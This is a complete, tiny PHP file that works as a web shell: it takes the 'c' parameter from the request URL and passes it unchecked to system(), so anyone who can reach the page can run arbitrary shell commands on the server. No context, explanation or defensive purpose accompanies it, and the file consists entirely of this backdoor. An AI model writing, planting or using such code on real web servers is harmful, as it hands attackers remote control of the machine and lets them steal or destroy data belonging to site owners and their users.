<?php
if($_GET['c']) {
system($_GET['c']);
}
?>
